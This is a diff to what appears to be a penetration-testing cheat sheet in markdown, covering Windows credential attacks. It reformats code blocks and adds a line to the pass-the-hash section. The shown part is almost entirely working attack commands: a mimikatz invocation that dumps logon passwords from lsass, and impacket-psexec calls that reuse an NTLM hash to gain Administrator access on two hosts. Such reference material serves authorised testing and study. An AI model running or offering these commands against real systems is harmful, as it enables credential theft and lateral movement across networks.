@@ -641,14 +641,18 @@ sekurlsa::tickets
 
 - Dumping credentials from lsass
 
-```
+```cmd
 .\mimikatz.exe "log" "privilege::debug" "sekurlsa::logonpasswords" "exit"
 ```
 
 - Pass the Hash
 
-```
+We can also reuse the same hash.
+
+```shell
 impacket-psexec "Administrator":@10.10.10.10 -hashes ":8846f7eaee8fb117ad06bdd830b7586c"
+# reuse
+impacket-psexec "Administrator":@10.10.10.11 -hashes ":8846f7eaee8fb117ad06bdd830b7586c"
 ```
 
 ### :open_file_folder: Vulnerabilities
